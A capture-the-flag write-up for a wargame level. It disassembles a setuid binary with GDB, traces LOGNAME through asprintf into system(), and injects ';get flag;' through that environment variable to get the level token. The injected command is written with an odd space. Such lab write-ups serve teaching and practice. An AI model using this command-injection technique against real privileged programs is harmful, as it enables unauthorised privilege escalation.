## Level 07: Exploiting an Environment Variable to Retrieve the Token

### Goal
Analyze the executable `level07`, identify its functionality with GDB (GNU Debugger), and exploit its behavior to retrieve the token for the next level.

## Steps

### I - How to Handle an Executable

1. **Inspect the Executable:**  
   Run the `level07` binary to see its initial behavior:  
   ```bash
   ./level07
   ```
   Output
   ```bash 
    level07
    ```
	The program simply outputs its name. Further analysis of its source code is required to determine how it functions.

2. **Analyze the Source Code Using GDB**  
	Use `GDB` (GNU Debugger) to inspect the binary's functionality.  
- The following `commands` help identify the program's structure and behavior:
	```bash
    gdb ./level07
    (gdb) info functions   # Liste les fonctions du binaire  
    (gdb) break main       # Ajoute un point d'arrêt sur la fonction main  
    (gdb) run              # Exécute le programme jusqu'au point d'arrêt  
    (gdb) disassemble main # Désassemble la fonction main
    ```
- Starting with `info functions` command:
    ```bash
    (gdb) info functions   # Liste les fonctions du binaire 
    ```
    Output:
    ```bash
	Non-debugging symbols:
    0x08048384  _init                   
    0x080483d0  setresuid               
    0x080483d0  setresuid@plt           
    0x080483e0  geteuid                 
    0x080483e0  geteuid@plt             
    0x080483f0  getegid                 
    0x080483f0  getegid@plt             
    0x08048400  getenv                  
    0x08048400  getenv@plt              
    0x08048410  system                  
    0x08048410  system@plt              
    0x08048420  __gmon_start__          
    0x08048420  __gmon_start__@plt      
    0x08048430  __libc_start_main       
    0x08048430  __libc_start_main@plt   
    0x08048440  asprintf                
    0x08048440  asprintf@plt            
    0x08048450  setresgid               
    0x08048450  setresgid@plt           
    0x08048460  _start                  
    0x08048490  __do_global_dtors_aux   
    0x080484f0  frame_dummy             
    0x080485b0  __libc_csu_init         
    0x08048620  __libc_csu_fini         
    0x08048622  __i686.get_pc_thunk.bx  
    0x08048630  __do_global_ctors_aux   
    0x0804865c  _fini                   
    ```
	Here, two functions seems of interest: `getenv` and `system`. But we don't have enought informations.
	- We proceed to disassemble the program, trying to find a vulnerability to exploit.
	```bash
    (gdb) disassemble main   # Liste les fonctions du binaire 
    ```
    Output:
    ```bash
    Dump of assembler code for function main:                  
    0x08048514 <+0>:     push   %ebp                        
    0x08048515 <+1>:     mov    %esp,%ebp                   
    0x08048517 <+3>:     and    $0xfffffff0,%esp            
    0x0804851a <+6>:     sub    $0x20,%esp                  
    0x0804851d <+9>:     call   0x80483f0 <getegid@plt>     
    0x08048522 <+14>:    mov    %eax,0x18(%esp)             
    0x08048526 <+18>:    call   0x80483e0 <geteuid@plt>     
    0x0804852b <+23>:    mov    %eax,0x1c(%esp)             
    0x0804852f <+27>:    mov    0x18(%esp),%eax             
    0x08048533 <+31>:    mov    %eax,0x8(%esp)              
    0x08048537 <+35>:    mov    0x18(%esp),%eax             
    0x0804853b <+39>:    mov    %eax,0x4(%esp)              
    0x0804853f <+43>:    mov    0x18(%esp),%eax             
    0x08048543 <+47>:    mov    %eax,(%esp)                 
    0x08048546 <+50>:    call   0x8048450 <setresgid@plt>   
    0x0804854b <+55>:    mov    0x1c(%esp),%eax             
    0x0804854f <+59>:    mov    %eax,0x8(%esp)              
    0x08048553 <+63>:    mov    0x1c(%esp),%eax             
    0x08048557 <+67>:    mov    %eax,0x4(%esp)              
    0x0804855b <+71>:    mov    0x1c(%esp),%eax             
    0x0804855f <+75>:    mov    %eax,(%esp)                 
    0x08048562 <+78>:    call   0x80483d0 <setresuid@plt>   
    0x08048567 <+83>:    movl   $0x0,0x14(%esp)             
    0x0804856f <+91>:    movl   $0x8048680,(%esp)           
    0x08048576 <+98>:    call   0x8048400 <getenv@plt>      
    0x0804857b <+103>:   mov    %eax,0x8(%esp)              
    0x0804857f <+107>:   movl   $0x8048688,0x4(%esp)        
    0x08048587 <+115>:   lea    0x14(%esp),%eax             
    0x0804858b <+119>:   mov    %eax,(%esp)                 
    0x0804858e <+122>:   call   0x8048440 <asprintf@plt>    
    0x08048593 <+127>:   mov    0x14(%esp),%eax             
    0x08048597 <+131>:   mov    %eax,(%esp)                 
    0x0804859a <+134>:   call   0x8048410 <system@plt>      
    0x0804859f <+139>:   leave                              
    0x080485a0 <+140>:   ret                             
    End of assembler dump.                                  
    ```

### II- Binary Analysis

1. **Assembly Key Concepts**
	- `ESP` (Extended Stack Pointer): Points to the top of the stack. The stack grows downward in memory.
	- `EAX`: Main accumulator register, typically holds function return values.
	- Function calls: Arguments are pushed onto the stack right-to-left, accessed via `ESP offsets` (e.g., `%esp` for first arg), and return values are stored in `EAX (%eax)`.
	- Memory reading: `x86` Architecture reads memory in `4-byte` increments, so stack offsets are typically multiples of 4 (`0x4`, `0x8`, `0xC`, etc.).

2. **Important Addresses and Analysis**  
	When analyzing the assembly code, certain addresses deserve our attention:

- First important address:
	```nasm
	0x0804856f :    movl   $0x8048680,(%esp)        
	0x08048576 :    call   0x8048400 <getenv@plt>   
	```
	Why investigate `0x8048680`?
	- This address is used as an argument for getenv()
	- getenv() takes an environment variable name as parameter
	- It's crucial to see which environment variable the program is trying to read

- Second important address:
	```nasm
	0x0804857f :    movl   $0x8048688,0x4(%esp)     
	0x0804858e :    call   0x8048440 <asprintf@plt> 
	```
	Why investigate `0x8048688`?
	- This address is loaded into 4(%esp), which will be the second argument of asprintf
	- The second argument of asprintf is always the format string
	- This format string will determine how the final command is constructed

	Using GDB to examine these addresses:
	```gdb
	(gdb) x/s 0x8048680
	0x8048680: "LOGNAME"
	(gdb) x/s 0x8048688
	0x8048688: "/bin/echo %s "
	```

	This analysis reveals:
	- The program uses the LOGNAME environment variable
	- The value of LOGNAME will be injected into the command "/bin/echo %s "

3. **Architecture and Calling Convention**  
	The binary is `32-bit (x86)`, which means:
	- Addresses are 4 bytes long
	- Arguments are passed on the stack
	- The stack is manipulated with 4-byte offsets

	The prototype of `asprintf` is:
	```c
	int asprintf(char **strp, const char *format, ...);
	```

	Following the cdecl calling convention on `x86`:
	- First argument (strp) → (%esp)
	- Second argument (format) → 4(%esp)
	- Third argument (LOGNAME value) → 8(%esp)

4. **Analyzed Assembly Code**
	```nasm
	0x0804856f :    movl   $0x8048680,(%esp)        ; Puts "LOGNAME" address on stack
	0x08048576 :    call   0x8048400 <getenv@plt>   ; Gets LOGNAME value
	0x0804857b :    mov    %eax,0x8(%esp)           ; Stores value at esp+8 (3rd arg)
	0x0804857f :    movl   $0x8048688,0x4(%esp)     ; Puts "/bin/echo %s " at esp+4 (2nd arg)
	0x08048587 :    lea    0x14(%esp),%eax          ; Prepares buffer for result
	0x0804858b :    mov    %eax,(%esp)              ; Sets buffer as 1st arg
	0x0804858e :    call   0x8048440 <asprintf@plt> ; Formats the command
	0x08048593 :    mov    0x14(%esp),%eax          ; Gets formatted command
	0x08048597 :    mov    %eax,(%esp)              ; Sets it as arg for system
	0x0804859a :    call   0x8048410 <system@plt>   ; Executes the command
	```

### III - Retrieve the Flag

1. **Vulnerability**  
	The program uses `asprintf` to create a shell command in the form:
	```bash
	/bin/echo <LOGNAME_value>
	```

	The `asprintf` function will:
	- Take the format "/bin/echo %s " stored at 4(%esp)
	- Replace %s with the LOGNAME value stored at 8(%esp)
	- Store the result at the address provided in (%esp)

	The `LOGNAME` value is directly injected into the command without validation. This allows injecting additional shell commands using the semicolon (`;`) as a command separator.

2. **Exploitation**  
	To exploit this vulnerability and retrieve the token:
- Modify the `LOGNAME` environment variable to inject our command and execute `level07`:
	```bash
	export LOGNAME=";get flag;"
	./level07
	```
	Output:
	```bash
	Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
	```
- When the program executes, `asprintf` will create the command:
	```bash
	/bin/echo ;get flag;
	```
	- During execution with `system`, the shell will:
	- Execute `/bin/echo` (which produces nothing as it has no argument)
	- Execute `get flag` (which retrieves the token)